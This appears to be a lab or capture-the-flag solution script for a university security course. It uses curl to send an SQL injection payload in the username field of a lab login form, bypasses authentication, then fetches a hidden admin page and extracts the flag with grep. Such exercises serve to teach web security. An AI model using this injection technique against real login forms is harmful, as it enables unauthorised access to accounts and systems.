# Use this to set your token, but DON'T LEAVE IT UNCOMMENTED IN YOUR SUBMISSION!
# export TOKEN="<YOUR-TOKEN>"

curl "https://0xa0.labs.dss.edu.distrinet-research.be/login" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -H "DSS-AUTH-TOKEN: $TOKEN" \
  --cookie-jar /tmp/cookies.txt \
  --cookie /tmp/cookies.txt \
  --data-raw "username=admin%22+--+comment&password=pass" -s > /dev/null

# --cookie-jar saves the cookies
# --cookie uses the stored cookies (without this, you won't be logged in in the second request)
# You might need to url-encode the data/url depending on the request
#  Use cyberchef to do this: https://gchq.github.io/CyberChef/
# Redirect output to /dev/null to avoid printing the response
#  -s makes curl silent too

curl "https://0xa0.labs.dss.edu.distrinet-research.be/very-secret-and-unknown-admin-page" \
  -H "DSS-AUTH-TOKEN: $TOKEN" \
  --cookie-jar /tmp/cookies.txt \
  --cookie /tmp/cookies.txt \
  -s | grep -oP "DSS{.*}"
# Use grep to extract the flag
